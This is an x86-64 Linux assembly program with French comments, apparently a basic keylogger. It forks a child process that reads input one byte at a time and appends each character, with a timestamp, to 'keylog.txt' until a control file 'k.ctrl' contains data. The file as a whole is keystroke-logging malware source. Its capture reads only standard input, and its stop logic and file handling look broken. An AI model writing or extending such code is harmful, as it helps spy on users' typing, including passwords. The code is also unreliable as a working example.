section .data
    fname db "keylog.txt", 0
    ctrl_file db "k.ctrl", 0    ; fichier ctrl pour stop
    fd dq 0                    ; stockage fd
    ctrl_fd dq 0               ; fd ctrl
    tbuf db 64 dup(0)          ; buffer timestamp
    nl db 0xa                  ; retour
    s db " | ", 0              ; separateur
    dpid dq 0                  ; pid du fork

section .bss
    buf resb 1                 ; stockage touche
    tspec resq 2               ; temps

section .text
global _start

_start:
    ; fork process
    mov rax, 57           
    syscall
    
    cmp rax, 0
    je child              
    mov [dpid], rax      
    jmp parent           

child:
    ; init log
    mov rax, 2            
    mov rdi, fname
    mov rsi, 102o        
    mov rdx, 0644o       
    syscall
    mov [fd], rax

    ; init ctrl       
    mov rax, 2
    mov rdi, ctrl_file
    mov rsi, 102o
    mov rdx, 0644o
    syscall
    mov [ctrl_fd], rax

loop:
    ; verif ctrl
    mov rax, 3            
    mov rdi, [ctrl_fd]
    syscall

    mov rax, 2            
    mov rdi, ctrl_file
    mov rsi, 0            
    mov rdx, 0644o
    syscall
    mov [ctrl_fd], rax

    ; lecture ctrl
    mov rax, 0
    mov rdi, [ctrl_fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    ; check stop
    cmp rax, 1           
    je exit

    ; get time
    mov rax, 228         
    mov rdi, 0           
    mov rsi, tspec
    syscall

    ; lecture touche
    mov rax, 0                
    mov rdi, 0                
    mov rsi, buf
    mov rdx, 1                
    syscall

    ; check erreur
    cmp rax, 0
    jle loop

    ; convertir temps
    mov rax, [tspec]
    mov rdi, tbuf
    call ft

    ; ecrire temps
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, tbuf
    mov rdx, 20              
    syscall

    ; ecrire sep
    mov rax, 1
    mov rdi, [fd]
    mov rsi, s
    mov rdx, 3
    syscall

    ; ecrire touche
    mov rax, 1                
    mov rdi, [fd]
    mov rsi, buf
    mov rdx, 1
    syscall

    ; retour ligne
    mov rax, 1
    mov rdi, [fd]
    mov rsi, nl
    mov rdx, 1
    syscall

    jmp loop

parent:
    ; cmd stop
    mov rax, 2            
    mov rdi, ctrl_file
    mov rsi, 102o        
    mov rdx, 0644o       
    syscall

    ; sortie parent
    mov rax, 60              
    xor rdi, rdi
    syscall

exit:
    ; nettoyage
    mov rax, 3                
    mov rdi, [fd]
    syscall

    mov rax, 3
    mov rdi, [ctrl_fd]
    syscall

    ; supprime ctrl
    mov rax, 87               
    mov rdi, ctrl_file
    syscall

    mov rax, 60               
    xor rdi, rdi
    syscall

ft:
    push rbx
    push rcx
    
    mov rbx, 10             
    add rdi, 19             
    mov byte [rdi], 0       
    
    mov rcx, 19            
.l:
    dec rdi
    xor rdx, rdx
    div rbx
    add dl, '0'
    mov [rdi], dl
    dec rcx
    test rax, rax
    jnz .l
    
    pop rcx
    pop rbx
    ret